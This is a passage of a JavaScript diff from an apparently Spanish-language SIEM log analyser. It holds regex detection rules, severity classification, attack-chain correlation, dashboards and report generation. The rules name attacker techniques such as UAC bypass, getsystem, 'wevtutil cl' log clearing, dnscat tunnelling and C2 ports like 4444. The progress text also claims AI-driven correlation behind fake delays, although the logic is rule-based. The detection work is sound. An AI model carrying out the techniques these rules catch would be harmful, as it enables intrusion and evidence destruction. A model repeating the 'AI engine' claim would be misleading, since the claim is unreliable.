+  actions:['Eliminar de inmediato la cuenta del grupo de administradores (y evaluar su eliminación completa).','Auditar la composición actual de los grupos Administradores de TODOS los servidores y estaciones.','Activar alertas en tiempo real para EventID 4732/4728 en el SIEM.']},
+ {re:/4672|special privileges assigned|privilegios especiales|seassignprimarytoken|seimpersonateprivilege/i,sev:'Alto',
+  name:'Asignación de privilegios especiales a la sesión (EventID 4672)',
+  tech:'El evento 4672 indica que el token de la sesión incluye privilegios de nivel administrador (SeDebugPrivilege, SeImpersonatePrivilege, etc.). En el contexto de una sesión de origen anómalo, confirma que el atacante opera con capacidad administrativa (contexto T1134 – Token manipulation).',
+  impact:'Capacidad de manipular procesos de otros usuarios, volcar memoria LSASS y escalar a SYSTEM.',
+  actions:['Correlacionar la cuenta con el origen del inicio de sesión y validar su uso legítimo.','Revisar cuentas con privilegios y aplicar modelo de acceso Just-In-Time.']},
+ {re:/usermod\s+-aG\s*(sudo|wheel|root)|sudo\s+su\b|pkexec|\bescalat|\bprivilege escalation\b|token impersonat|runas\s+\/netonly|bypassuac|getsystem/i,sev:'Alto',
+  name:'Indicadores de escalada de privilegios (Linux/Windows)',
+  tech:'Patrones asociados a elevación de privilegios: modificación de pertenencia a sudo/wheel, escalada explícita, impersonación de tokens, bypass de UAC o comandos getsystem.',
+  impact:'El atacante pasa de usuario estándar a privilegios root/administrador, con control total del sistema.',
+  actions:['Revisar sudoers / pertenencia a grupos privilegiados en los hosts afectados.','Buscar artefactos de herramientas de escalada conocidas.']}
+];
+function detectEscalation(){
+  ESC_RULES.forEach(rule=>{
+    const hits=state.rows.filter(r=>rule.re.test(r.raw));
+    if(!hits.length) return;
+    const tss=hits.filter(h=>h.ts).map(h=>h.ts).sort((a,b)=>a-b);
+    const users=[...new Set(hits.map(h=>h.user).filter(Boolean))];
+    addFinding('Escalamiento',rule.sev,rule.name+` (${hits.length} evento(s))`,
+      rule.tech+`${tss.length?` Ocurrencia(s): ${tss.map(fmtTs).slice(0,4).join(' · ')}${tss.length>4?` y ${tss.length-4} más`:''}.`:''}${users.length?` Cuentas involucradas: ${users.join(', ')}.`:''}`,
+      `Detección basada en ${hits.length} registro(s) del archivo del cliente que coinciden con patrones documentados de elevación de privilegios (listados uno a uno en la evidencia y el anexo). Severidad ${rule.sev} por el control total que confieren los privilegios obtenidos.`,
+      rule.impact, rule.actions, hits, entCollect(hits));
+  });
+}
+
+const OTHER_RULES=[
+ {re:/7045|service installed|servicio.*instalad|se instaló un nuevo servicio|se instalo un nuevo servicio|sc\s+create/i,sev:'Alto',
+  name:'Instalación de un nuevo servicio en el sistema',
+  tech:'El EventID 7045 (Service Control Manager) documenta la instalación de un servicio nuevo. Los atacantes instalan servicios (p. ej. PSEXESVC, nombres que imitan actualizaciones) para ejecutar código con privilegios SYSTEM y/o persistir (T1543.003 – Create or Modify System Process: Windows Service).',
+  impact:'Ejecución privilegiada persistente en el servidor afectado.',
+  actions:['Identificar el binario del servicio instalado y analizarlo.','Eliminar servicios no reconocidos y bloquear su recreación.']},
+ {re:/1102|audit.*log.*clear(ed)?|se borró el registro|se borro el registro|wevtutil\s+cl|clear-eventlog/i,sev:'Crítico',
+  name:'Borrado de registros de auditoría (anti-forense)',
+  tech:'El EventID 1102 o el comando wevtutil cl evidencian la limpieza deliberada del log de Seguridad. Es una técnica anti-forense (T1070.001 – Indicator Removal: Clear Windows Event Logs) que solo ejecuta un actor consciente de estar siendo monitorizado.',
+  impact:'Pérdida de visibilidad histórica del ataque en el equipo afectado; posible destrucción de evidencia. Señal de actor sofisticado y de que la intrusión sigue activa.',
+  actions:['Aislar el equipo y preservar la imagen forense antes de cualquier acción.','Habilitar reenvío de logs en tiempo real a un repositorio WORM/inmutable.','Verificar qué actividad ocurrió justo antes del borrado.']},
+ {re:/4720|user account created|cuenta.*(de usuario )?cread|a user account was created/i,sev:'Medio',
+  name:'Creación de cuenta de usuario detectada en eventos de seguridad',
+  tech:'EventID 4720 (creación de cuenta). En el contexto de una intrusión activa, las cuentas nuevas suelen ser backdoors de persistencia (T1136).',
+  impact:'Posible puerta trasera para acceso futuro del atacante.',
+  actions:['Inventariar todas las cuentas creadas en el periodo del incidente y validarlas contra RRHH.','Eliminar las no autorizadas.']},
+ {re:/4740|account locked|cuenta bloqueada|locked out|lockout/i,sev:'Medio',
+  name:'Bloqueo de cuenta (corrobora ataque de fuerza bruta)',
+  tech:'EventID 4740 / eventos de bloqueo: la cuenta fue bloqueada tras intentos fallidos consecutivos. Es la consecuencia directa de un ataque de fuerza bruta y una evidencia adicional del mismo (T1110).',
+  impact:'Confirma presión activa sobre las credenciales del usuario; posible denegación de servicio sobre la cuenta.',
+  actions:['Correlacionar el bloqueo con los fallos de autenticación previos y el origen.','No desbloquear la cuenta hasta validar que no hay sesión ilegítima activa.']},
+ {re:/4771|pre-auth(entication)? failed|kerberos[^|]*(fail|reject)/i,sev:'Medio',
+  name:'Fallos de pre-autenticación Kerberos',
+  tech:'EventID 4771: fallos de pre-autenticación Kerberos, utilizados en ataques de fuerza bruta contra cuentas de dominio (AS-REP) y password spraying (T1558).',
+  impact:'Intentos de comprometer credenciales de dominio; posible exposición de cuentas sin pre-auth.',
+  actions:['Revisar cuentas objetivo y códigos de error (0x17 = contraseña incorrecta).','Habilitar detección de AS-REP roasting (cuentas con no-preauth).']},
+ {re:/4769[^|]*(0x17|rc4)|golden ticket|silver ticket|kerberoast/i,sev:'Alto',
+  name:'Anomalía Kerberos (Golden/Silver Ticket, downgrade RC4, Kerberoasting)',
+  tech:'Solicitudes de ticket con cifrado degradado (RC4/0x17) o patrones asociados a Golden/Silver Ticket y Kerberoasting (T1558.003, T1550).',
+  impact:'Posible compromiso del servicio krbtgt o de cuentas de servicio; persistencia de dominio prácticamente indetectable.',
+  actions:['Rotar dos veces la cuenta krbtgt si se confirma Golden Ticket.','Auditar SPNs de cuentas de servicio y forzar AES.']},
+ {re:/(puerto|port)\s*(4444|1337|5555|6667|666\d|31337|4443)|\birc\b|ngrok|pastebin|anonymiz|\bc2\b|beacon|command.and.control|tor\b/i,sev:'Alto',
+  name:'Comunicación saliente hacia puerto/destino asociado a C2',
+  tech:'Conexiones hacia puertos no corporativos (4444, 1337, IRC/6667) o servicios de anonimización/paste/túneles. Son canales típicos de Command & Control y exfiltración (T1071, T1571 – Non-Standard Port).',
+  impact:'El atacante conserva control remoto del equipo y puede extraer datos o desplegar más malware.',
+  actions:['Bloquear la IP/puerto de destino en el firewall perimetral.','Capturar tráfico (si es posible) para dimensionar la exfiltración.','Cazar el mismo destino en el resto de la red.']},
+ {re:/dnscat|dns\s*tunnel|zone transfer|dns[^|]*(txt|long query)|\bid\.txt\b/i,sev:'Alto',
+  name:'Posible tunelización / anomalía DNS',
+  tech:'Consultas DNS anómalas (subdominios largos, registros TXT, transferencia de zona) compatibles con tunelización C2/DNS (T1071.004).',
+  impact:'Canal encubierto de control y exfiltración que atraviesa el firewall.',
+  actions:['Inspeccionar logs DNS del servidor y longitud de consultas.','Bloquear dominios destino identificados.']},
+ {re:/5140[^|]*(admin\$|ipc\$|c\$)|use of (special|remote) share|recurso compartido administrativo/i,sev:'Medio',
+  name:'Acceso a recurso compartido administrativo (ADMIN$/IPC$/C$)',
+  tech:'Conexión a recursos compartidos administrativos ocultos, usada para copiar y ejecutar payloads remotamente (T1021.002 – SMB/Windows Admin Shares).',
+  impact:'Vector de despliegue lateral de herramientas y malware.',
+  actions:['Identificar la cuenta y equipo origen del acceso.','Restringir el acceso administrativo a equipos de salto dedicados.']},
+ {re:/acceso masivo|mass(ive)? (file )?access|(\d{3,})\s*(archivos|files)\s*(leídos|leidos|accessed|copiad)|exfiltr|data staged|transfere?ncia masiva/i,sev:'Alto',
+  name:'Acceso masivo a archivos / posible preparación de exfiltración',
+  tech:'Volumen de lectura de archivos muy superior al patrón del usuario o proceso (data staging, T1074/T1530). Los archivos del recurso indicado se concentraron en minutos, patrón incompatible con uso humano normal.',
+  impact:'Riesgo de fuga de información sensible (financiera, personal, propiedad intelectual) con implicaciones legales bajo GDPR/NIS2.',
+  actions:['Determinar qué datos se accedieron y si salieron de la red.','Notificar al DPO para evaluar obligación de notificación (GDPR art. 33).','Restringir permisos del recurso compartido afectado.']},
+ {re:/\busb\b|removable (drive|storage)|dispositivo extraíble|dispositivo extraible|mass storage device/i,sev:'Bajo',
+  name:'Uso de dispositivo de almacenamiento extraíble',
+  tech:'Conexión de medio extraíble detectada en los logs. Aunque puede ser legítima, en contexto de incidente es vector de exfiltración o de introducción de malware (T1091, T1052.001).',
+  impact:'Posible fuga o contaminación de datos por medio físico.',
+  actions:['Verificar política de control de USB y su aplicación efectiva.','Identificar al usuario y equipo del evento.']}
+];
+function detectOther(){
+  OTHER_RULES.forEach(rule=>{
+    const hits=state.rows.filter(r=>rule.re.test(r.raw));
+    const uniqHits=hits.filter((h,i,a)=>a.findIndex(x=>x.idx===h.idx)===i);
+    if(!uniqHits.length) return;
+    const tss=uniqHits.filter(h=>h.ts).map(h=>h.ts).sort((a,b)=>a-b);
+    addFinding('Otras Anomalías',rule.sev,rule.name+` (${uniqHits.length} evento(s))`,
+      rule.tech+`${tss.length?` Timestamp(s): ${tss.map(fmtTs).slice(0,4).join(' · ')}${tss.length>4?` y ${tss.length-4} más`:''}.`:''}`,
+      `Basado en ${uniqHits.length} registro(s) del archivo proporcionado (todos incluidos en la evidencia y en el anexo de clasificación individual). Criticidad ${rule.sev} según el potencial de daño y su valor como indicador de intrusión activa.`,
+      rule.impact, rule.actions, uniqHits, entCollect(uniqHits));
+  });
+}
+
+/* ============================================================
+   CLASIFICACIÓN INDIVIDUAL DE CADA REGISTRO (cobertura 100%)
+============================================================ */
+const ROW_RULES=(()=>{
+  const R=[];
+  CMD_RULES.forEach(r=>R.push({re:r.re,sev:r.sev,label:'Cmd/Proc: '+r.name}));
+  ESC_RULES.forEach(r=>R.push({re:r.re,sev:r.sev,label:'Escalamiento: '+r.name}));
+  OTHER_RULES.forEach(r=>R.push({re:r.re,sev:r.sev,label:'Anomalía: '+r.name}));
+  R.push({re:/\brdp\b|3389|admin\$|psexec|psexesvc|winrm|5985|5986|\\c\$/i,sev:'Medio',label:'Conexión remota / posible movimiento lateral'});
+  R.push({re:/\bsmb\b|\b445\b/i,sev:'Bajo',label:'Tráfico SMB detectado (revisar destino)'});
+  return R;
+})();
+
+function classifyAll(){
+  const bfIps=state._bfSuccessIps||new Set();
+  const findingByRow={};
+  state.findings.forEach(f=>f.evIdx.forEach(i=>{
+    const cur=findingByRow[i];
+    if(!cur||sevRank(f.sev)<sevRank(cur.sev)) findingByRow[i]=f;
+  }));
+  state.rowClass=state.rows.map(r=>{
+    let sev=null; const reasons=[];
+    for(const rule of ROW_RULES){
+      if(rule.re.test(r.raw)){
+        if(sev===null||sevRank(rule.sev)<sevRank(sev)) sev=rule.sev;
+        if(reasons.length<2 && !reasons.includes(rule.label)) reasons.push(rule.label);
+      }
+    }
+    // Éxito fuera de horario (00:00–05:59)
+    if(r.ts&&OK.test(r.txt)&&!FAIL.test(r.txt)&&AUTH.test(r.txt)){
+      const h=r.ts.getHours();
+      if(h<6&&!bfIps.has(r.srcIp)){
+        if(sev===null||sevRank('Alto')<sevRank(sev)) sev='Alto';
+        const lb='Inicio de sesión exitoso fuera de horario (00:00–05:59)';
+        if(reasons.length<2) reasons.push(lb);
+      }
+    }
+    // Fallo de autenticación aislado
+    if(AUTH.test(r.txt)&&FAIL.test(r.txt)&&!OK.test(r.txt)){
+      if(sev===null||sevRank('Bajo')<sevRank(sev)) sev='Bajo';
+      if(reasons.length<2) reasons.push('Fallo de autenticación (revisar si es aislado o parte de ataque)');
+    }
+    // Bloqueos
+    if(/4740|account locked|cuenta bloqueada|locked out/i.test(r.raw)){
+      if(sev===null||sevRank('Medio')<sevRank(sev)) sev='Medio';
+      if(reasons.length<2) reasons.push('Bloqueo de cuenta (indicador de fuerza bruta)');
+    }
+    // Pertenencia a un hallazgo (prevalece la severidad mayor)
+    const f=findingByRow[r.idx];
+    if(f){
+      if(sev===null||sevRank(f.sev)<sevRank(sev)) sev=f.sev;
+      reasons.unshift(`Evidencia de ${f.id} (${f.cat})`);
+      reasons.splice(2);
+    }
+    return {sev:sev||'Sin riesgo',reason:reasons.slice(0,2).join(' · ')||'Evento normal: coincide con la línea base de actividad legítima del periodo'};
+  });
+  state.rows.forEach((r,i)=>{ r.riskCls=state.rowClass[i]; });
+}
+
+function riskDist(){
+  const d={'Crítico':0,'Alto':0,'Medio':0,'Bajo':0,'Sin riesgo':0};
+  state.rows.forEach(r=>{ if(r.riskCls) d[r.riskCls.sev]++; });
+  return d;
+}
+
+/* ============================================================
+   CORRELACIÓN (cadenas de ataque) + AJUSTE DE SEVERIDAD
+============================================================ */
+function correlate(){
+  const F=state.findings;
+  const parent=F.map((_,i)=>i);
+  const find=i=>parent[i]===i?i:(parent[i]=find(parent[i]));
+  const uni=(a,b)=>{a=find(a);b=find(b);if(a!==b)parent[b]=a;};
+  for(let i=0;i<F.length;i++)for(let j=i+1;j<F.length;j++){
+    const A=F[i].entities,B=F[j].entities;
+    const share=(x,y)=>(x||[]).some(v=>(y||[]).includes(v));
+    if(share(A.ips,B.ips)||share(A.users,B.users)||share(A.hosts,B.hosts)) uni(i,j);
+  }
+  const groups={};
+  F.forEach((f,i)=>{const r=find(i);(groups[r]=groups[r]||[]).push(f);});
+  let n=0;
+  state.chains=Object.values(groups).filter(g=>g.length>=2).map(g=>{
+    n++; const id='CAD-'+n;
+    g.sort((a,b)=>(KILL_ORDER[a.cat]-KILL_ORDER[b.cat])||((a.firstTs||0)-(b.firstTs||0)));
+    g.forEach(f=>f.chainId=id);
+    const cats=[...new Set(g.map(f=>f.cat))].sort((a,b)=>KILL_ORDER[a]-KILL_ORDER[b]);
+    const ips=[...new Set(g.flatMap(f=>f.entities.ips))];
+    const users=[...new Set(g.flatMap(f=>f.entities.users))];
+    const hosts=[...new Set(g.flatMap(f=>f.entities.hosts))];
+    const tss=g.map(f=>f.firstTs).filter(Boolean).sort((a,b)=>a-b);
+    if(cats.length>=3){
+      g.forEach(f=>{
+        if(f.sev==='Medio'){ f.sev='Alto'; f.chainNote=' Severidad elevada de Medio a Alto por correlación: este evento forma parte de una cadena de ataque multi-etapa confirmada.'; }
+        else if(f.sev==='Bajo'){ f.sev='Medio'; f.chainNote=' Severidad elevada de Bajo a Medio por correlación con la cadena de ataque.'; }
+      });
+    }
+    const steps=g.map(f=>`«${f.title}»${f.firstTs?` a las ${fmtTs(f.firstTs)}`:''}`).join(' → ');
+    const narrative=`El motor de correlación vinculó ${g.length} hallazgos que comparten entidades (${[ips.join(', '),users.join(', '),hosts.join(', ')].filter(x=>x).join(' | ')}). Secuencia reconstruida${tss.length?` desde ${fmtTs(tss[0])} hasta ${fmtTs(tss[tss.length-1])}`:''}: ${steps}. Las etapas cubren ${cats.length} fases de la cadena de ataque (${cats.join(' → ')}), patrón coherente con una intrusión humana dirigida y no con falsos positivos aislados.`;
+    return {id,cats,ips,users,hosts,findings:g,narrative,start:tss[0]||null,end:tss[tss.length-1]||null};
+  });
+  // re-clasificación de severidad tras ajuste por correlación → reclasificar filas afectadas después
+  state.findings.sort((a,b)=>sevRank(a.sev)-sevRank(b.sev)||(KILL_ORDER[a.cat]-KILL_ORDER[b.cat]));
+}
+
+/* ============================================================
+   EJECUCIÓN DEL ANÁLISIS (con progreso del motor IA)
+============================================================ */
+async function runAnalysis(){
+  if(!state.rows.length){ toast('No hay datos cargados.','err'); return; }
+  state.findings=[]; state.chains=[]; state.suspiciousIdx=new Set(); FID=0; state._bfSuccessIps=new Set();
+  state.iocs={ips:new Set(),users:new Set(),hosts:new Set(),cmds:new Set()};
+  state.rowClass=[];
+  $('findingsArea').style.display='none'; $('analysisEmpty').style.display='none';
+  const pw=$('progressWrap'); pw.classList.add('show'); $('btnAnalyze').disabled=true;
+  const steps=[
+    ['Normalizando y enriqueciendo '+state.rows.length+' registros…',10,null],
+    ['Aplicando reglas de detección de fuerza bruta…',24,detectBruteForce],
+    ['Analizando ejecución de comandos y procesos…',40,detectCommands],
+    ['Evaluando inicios de sesión anómalos…',52,detectSuspiciousLogins],
+    ['Detectando movimiento lateral, escalada y otras anomalías…',64,()=>{detectLateral();detectEscalation();detectOther();}],
+    ['Detectando multi-sesión por usuario y correlacionando entidades con IA…',78,()=>{detectMultiHostLogon();correlate();}],
+    ['Clasificando individualmente los '+state.rows.length+' eventos (cobertura 100%)…',90,classifyAll],
+    ['Consolidando riesgos y redactando informe técnico…',100,null]
+  ];
+  for(const [txt,pct,fn] of steps){
+    $('pstepText').textContent='▸ '+txt; $('pbarFill').style.width=pct+'%';
+    await new Promise(r=>setTimeout(r,330+Math.random()*220));
+    if(fn) fn();
+  }
+  setTimeout(()=>{
+    pw.classList.remove('show'); $('btnAnalyze').disabled=false;
+    state.analyzed=true; markDone('analisis');
+    $('analysisEmpty').style.display='none';
+    renderFindings(); renderCoverage(); renderClassPanel();
+    $('btnPdf').disabled=false;
+    $('btnExportCls').style.display='inline-flex'; $('btnExportCls2').style.display='inline-flex';
+    const c=state.findings.filter(f=>f.sev==='Crítico').length;
+    const a=state.findings.filter(f=>f.sev==='Alto').length;
+    const d=riskDist();
+    toast(`Análisis completado: ${state.findings.length} hallazgos (${c} críticos, ${a} altos) · ${state.rows.length} eventos clasificados individualmente (${d['Sin riesgo']} sin riesgo).`);
+    $('findingsArea').style.display='block';
+  },420);
+}
+
+function renderCoverage(){
+  const d=riskDist(), N=state.rows.length;
+  $('coverageBar').innerHTML=`✅ <b>Cobertura del análisis: ${N}/${N} registros clasificados individualmente (100%)</b><br>
+    <span class="c-crit">🔴 Crítico: ${d['Crítico']}</span> · <span class="c-alto">🟠 Alto: ${d['Alto']}</span> ·
+    <span class="c-med">🟡 Medio: ${d['Medio']}</span> · <span class="c-bajo">🟢 Bajo: ${d['Bajo']}</span> ·
+    <span class="c-ok">⚪ Sin riesgo: ${d['Sin riesgo']}</span>
+    &nbsp;—&nbsp; Eventos vinculados a hallazgos: <b>${state.suspiciousIdx.size}</b> · Ningún registro queda fuera del informe (ver tabla inferior, Anexo A del PDF y exportación Excel).`;
+}
+
+function filterFindings(sev,el){
+  document.querySelectorAll('#sevFilters .chip').forEach(c=>c.classList.remove('active'));
+  el.classList.add('active'); renderFindings(sev);
+}
+function renderFindings(filter='Todos'){
+  const list=state.findings.filter(f=>filter==='Todos'||f.sev===filter);
+  $('fCount').textContent=state.findings.length;
+  const worst=SEV_ORDER.find(s=>state.findings.some(f=>f.sev===s));
+  $('riskBadge').innerHTML=`Riesgo global del incidente: <span class="sev ${worst}">${worst||'—'}</span>`;
+  if(!list.length){ $('findingsList').innerHTML='<div class="empty">No hay hallazgos con este filtro.</div>'; return; }
+  $('findingsList').innerHTML=list.map(f=>`
+   <div class="finding">
+     <div class="f-head" onclick="this.nextElementSibling.classList.toggle('open')">
+       <span class="sev ${f.sev}">${f.sev}</span>
+       <div style="flex:1">
+         <div class="f-title">${f.id} · ${esc(f.title)}</div>
+         <div class="f-cat">🏷️ ${f.cat}${f.chainId?` · 🔗 ${f.chainId}`:''} · 📎 ${f.evCount} registro(s) de evidencia${f.firstTs?` · 🕒 ${fmtTs(f.firstTs)}`:''}</div>
+       </div>
+       <span style="color:var(--muted)">▾</span>
+     </div>
+     <div class="f-body">
+       <div class="f-block"><h4>Explicación técnica</h4><p>${esc(f.tech)}${f.chainNote?'<br><b>'+esc(f.chainNote.trim())+'</b>':''}</p></div>
+       <div class="f-block"><h4>Criticidad y justificación</h4><p><span class="sev ${f.sev}">${f.sev}</span> &nbsp;${esc(f.justification)}</p></div>
+       <div class="f-block"><h4>Impacto potencial en la organización</h4><p>${esc(f.impact)}</p></div>
+       <div class="f-block"><h4>Evidencias en los logs (fila de Excel · timestamp · registro) — ${f.evCount} en total</h4>
+         <pre class="evi">${f.evidence.map(e=>`[Fila ${e.row}] ${e.ts}\n  ${esc(e.text)}`).join('\n')}${f.evCount>f.evidence.length?`\n  … y ${f.evCount-f.evidence.length} registro(s) adicional(es) — TODOS incluidos en el Anexo A del PDF y en la exportación Excel`:''}</pre></div>
+       <div class="f-block"><h4>Acciones recomendadas</h4><ul>${f.actions.map(a=>`<li>${esc(a)}</li>`).join('')}</ul></div>
+     </div>
+   </div>`).join('');
+}
+
+/* ---------- Tabla de clasificación individual (paginada + filtro + búsqueda) ---------- */
+const clsState={sev:'Todos',q:'',page:1,perPage:40};
+function filterCls(sev,el){
+  document.querySelectorAll('#clsFilters .chip').forEach(c=>c.classList.remove('active'));
+  el.classList.add('active'); clsState.sev=sev; clsState.page=1; drawClass();
+}
+function clsFiltered(){
+  return state.rows.filter(r=>{
+    if(!r.riskCls) return false;
+    if(clsState.sev!=='Todos'&&r.riskCls.sev!==clsState.sev) return false;
+    if(clsState.q){
+      const hay=(r.raw+' '+r.riskCls.reason).toLowerCase();
+      if(!hay.includes(clsState.q)) return false;
+    }
+    return true;
+  });
+}
+function renderClassPanel(){ $('clsTotal').textContent=state.rows.length; drawClass(); }
+function drawClass(){
+  const all=clsFiltered();
+  const totalPages=Math.max(1,Math.ceil(all.length/clsState.perPage));
+  if(clsState.page>totalPages) clsState.page=totalPages;
+  const start=(clsState.page-1)*clsState.perPage;
+  const slice=all.slice(start,start+clsState.perPage);
+  let html='<thead><tr><th>Fila Excel</th><th>Timestamp</th><th>Riesgo</th><th>Justificación</th><th>Registro</th></tr></thead><tbody>';
+  slice.forEach(r=>{
+    const cls=r.riskCls.sev==='Sin riesgo'?'SinRiesgo':r.riskCls.sev;
+    html+=`<tr><td>${r.idx+2}</td><td class="mono" style="font-size:11px">${fmtTs(r.ts)}</td>
+      <td><span class="sev ${cls}">${r.riskCls.sev}</span></td>
+      <td title="${esc(r.riskCls.reason)}" style="max-width:280px">${esc(r.riskCls.reason)}</td>
+      <td title="${esc(r.raw)}" style="max-width:380px;font-size:11px;color:#93a7c6">${esc(r.raw.slice(0,150))}</td></tr>`;
+  });
+  html+='</tbody>';
+  $('clsTable').innerHTML=html;
+  $('clsPageInfo').textContent=`Página ${clsState.page} / ${totalPages} — ${all.length} registro(s) en el filtro`;
+  $('clsPrev').disabled=clsState.page<=1; $('clsNext').disabled=clsState.page>=totalPages;
+}
+function exportClassificationXlsx(){
+  if(!state.analyzed){ toast('Ejecuta el análisis primero.','err'); return; }
+  try{
+    const data=state.rows.map(r=>({
+      'Fila_Excel':r.idx+2,'Timestamp':r.ts?fmtTs(r.ts):'','Usuario':r.user,'IP_Origen':r.srcIp,
+      'Equipo_Destino':r.dstHost,'Nivel_Riesgo':r.riskCls?r.riskCls.sev:'','Justificacion':r.riskCls?r.riskCls.reason:'',
+      'Registro_Completo':r.raw
+    }));
+    const wb=XLSX.utils.book_new();
+    const ws=XLSX.utils.json_to_sheet(data);
+    ws['!cols']=[{wch:10},{wch:20},{wch:16},{wch:16},{wch:14},{wch:12},{wch:50},{wch:100}];
+    XLSX.utils.book_append_sheet(wb,ws,'Clasificacion_Eventos');
+    const d=riskDist();
+    const ws2=XLSX.utils.json_to_sheet([
+      {'Nivel':'Crítico','Eventos':d['Crítico']},{'Nivel':'Alto','Eventos':d['Alto']},
+      {'Nivel':'Medio','Eventos':d['Medio']},{'Nivel':'Bajo','Eventos':d['Bajo']},
+      {'Nivel':'Sin riesgo','Eventos':d['Sin riesgo']},{'Nivel':'TOTAL','Eventos':state.rows.length}
+    ]);
+    XLSX.utils.book_append_sheet(wb,ws2,'Resumen');
+    XLSX.writeFile(wb,`Clasificacion_completa_eventos_${new Date().toISOString().slice(0,10)}.xlsx`);
+    toast('✅ Clasificación completa exportada a Excel ('+state.rows.length+' registros).');
+  }catch(e){ toast('Error al exportar: '+e.message,'err'); }
+}
+
+/* ============================================================
+   DASHBOARD
+============================================================ */
+function destroyChart(k){ if(charts[k]){ charts[k].destroy(); delete charts[k]; } }
+function renderDashboard(){
+  const F=state.findings, M=state.meta, d=riskDist();
+  const count=s=>F.filter(f=>f.sev===s).length;
+  $('statCards').innerHTML=`
+    <div class="stat"><div class="v">${M.totalRows}</div><div class="l">Eventos analizados (100% clasificados)</div></div>
+    <div class="stat"><div class="v">${state.suspiciousIdx.size}</div><div class="l">Eventos con riesgo (no normales)</div></div>
+    <div class="stat"><div class="v">${F.length}</div><div class="l">Hallazgos consolidados</div></div>
+    <div class="stat crit"><div class="v">${count('Crítico')}</div><div class="l">Hallazgos críticos</div></div>
+    <div class="stat high"><div class="v">${count('Alto')}</div><div class="l">Hallazgos altos</div></div>
+    <div class="stat med"><div class="v">${count('Medio')}</div><div class="l">Hallazgos medios</div></div>
+    <div class="stat low"><div class="v">${count('Bajo')}</div><div class="l">Hallazgos bajos</div></div>
+    <div class="stat"><div class="v">${state.chains.length}</div><div class="l">Cadenas de ataque correlacionadas</div></div>
+    <div class="stat"><div class="v">${d['Crítico']} / ${d['Alto']}</div><div class="l">Eventos críticos / altos</div></div>
+    <div class="stat"><div class="v">${M.users.size} / ${M.ips.size}</div><div class="l">Usuarios / IPs únicos</div></div>`;
+  Chart.defaults.color='#8ba0c2'; Chart.defaults.borderColor='#1e2c4a'; Chart.defaults.font.family='Inter';
+
+  destroyChart('sev');
+  const sevC=SEV_ORDER.filter(s=>count(s)>0);
+  charts.sev=new Chart($('chSev'),{type:'doughnut',
+    data:{labels:sevC,datasets:[{data:sevC.map(count),backgroundColor:sevC.map(s=>`rgb(${SEV_RGB[s].join(',')})`),borderColor:'#0d1526',borderWidth:2}]},
+    options:{plugins:{legend:{position:'bottom'}},cutout:'62%'}});
+
+  destroyChart('cat');
+  const catC=CATS.filter(c=>F.some(f=>f.cat===c));
+  charts.cat=new Chart($('chCat'),{type:'bar',
+    data:{labels:catC,datasets:[{label:'Hallazgos',data:catC.map(c=>F.filter(f=>f.cat===c).length),
+      backgroundColor:'#22d3ee',borderRadius:6}]},
+    options:{indexAxis:'y',plugins:{legend:{display:false}},scales:{x:{ticks:{precision:0}}}}});
+
+  destroyChart('risk');
+  const riskLevels=['Crítico','Alto','Medio','Bajo','Sin riesgo'];
+  charts.risk=new Chart($('chRisk'),{type:'doughnut',
+    data:{labels:riskLevels.map(l=>l+` (${d[l]})`),datasets:[{data:riskLevels.map(l=>d[l]),
+      backgroundColor:['rgb(239,68,68)','rgb(249,115,22)','rgb(234,179,8)','rgb(34,197,94)','rgb(100,116,139)'],
+      borderColor:'#0d1526',borderWidth:2}]},
+    options:{plugins:{legend:{position:'bottom'}},cutout:'55%'}});
+
+  destroyChart('time');
+  const hours=Array.from({length:24},(_,h)=>h);
+  const total=hours.map(()=>0), susp=hours.map(()=>0);
+  state.rows.forEach(r=>{ if(r.ts){ const h=r.ts.getHours(); total[h]++; if(state.suspiciousIdx.has(r.idx)) susp[h]++; }});
+  charts.time=new Chart($('chTime'),{type:'bar',
+    data:{labels:hours.map(h=>String(h).padStart(2,'0')+'h'),datasets:[
+      {label:'Eventos totales',data:total,backgroundColor:'rgba(129,140,248,.45)',borderRadius:4},
+      {label:'Eventos sospechosos',data:susp,backgroundColor:'rgba(239,68,68,.85)',borderRadius:4}]},
+    options:{plugins:{legend:{position:'bottom'}},scales:{x:{stacked:true},y:{stacked:true,ticks:{precision:0}}}}});
+
+  destroyChart('ips');
+  const ipCount={};
+  F.forEach(f=>(f.entities.ips||[]).forEach(ip=>ipCount[ip]=(ipCount[ip]||0)+1));
+  const topIps=Object.entries(ipCount).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  charts.ips=new Chart($('chIps'),{type:'bar',
+    data:{labels:topIps.map(x=>x[0]),datasets:[{label:'Hallazgos asociados',data:topIps.map(x=>x[1]),
+      backgroundColor:'#f97316',borderRadius:6}]},
+    options:{indexAxis:'y',plugins:{legend:{display:false}},scales:{x:{ticks:{precision:0}}}}});
+  markDone('dashboard');
+}
+
+/* ============================================================
+   INFORME TÉCNICO (HTML)
+============================================================ */
+function overallRisk(){ return SEV_ORDER.find(s=>state.findings.some(f=>f.sev===s))||'Bajo'; }
+function nowStr(){ const d=new Date(); return d.toLocaleDateString('es-ES',{day:'2-digit',month:'long',year:'numeric'})+' · '+d.toLocaleTimeString('es-ES',{hour:'2-digit',minute:'2-digit'}); }
+
+function buildReportData(){
+  const F=state.findings, M=state.meta, d=riskDist();
+  const sevCount=s=>F.filter(f=>f.sev===s).length;
+  const risk=overallRisk();
+  const exec=`Se analizó un total de <b>${M.totalRows}</b> registros de eventos exportados del SIEM del cliente (archivo: <b>${esc(state.fileName)}</b>)${M.minTs?`, correspondientes al periodo <b>${fmtTs(M.minTs)} → ${fmtTs(M.maxTs)}</b>`:''}. El motor de análisis identificó <b>${F.length} hallazgos</b> (${sevCount('Crítico')} críticos, ${sevCount('Alto')} altos, ${sevCount('Medio')} medios, ${sevCount('Bajo')} bajos) y correlacionó <b>${state.chains.length} cadena(s) de ataque</b> entre entidades comunes (IP, usuario, equipo). Adicionalmente, <b>los ${M.totalRows} registros fueron clasificados individualmente con cobertura del 100%</b>: <b>${d['Crítico']}</b> eventos de riesgo Crítico, <b>${d['Alto']}</b> Alto, <b>${d['Medio']}</b> Medio, <b>${d['Bajo']}</b> Bajo y <b>${d['Sin riesgo']}</b> clasificados como actividad normal según la línea base — ningún registro quedó fuera del análisis (ver Anexo A y exportación Excel adjunta). El nivel de riesgo global del incidente se clasifica como <b>${risk.toUpperCase()}</b>.`
+   + (state.chains.length?` La correlación demuestra que los eventos no son anomalías aisladas: constituyen una secuencia coherente de intrusión que abarca múltiples fases de la cadena de ataque (acceso inicial, ejecución, escalada, movimiento lateral y acciones sobre objetivos).`
+      :' No se pudo establecer correlación entre hallazgos: los eventos se documentan de forma independiente.');
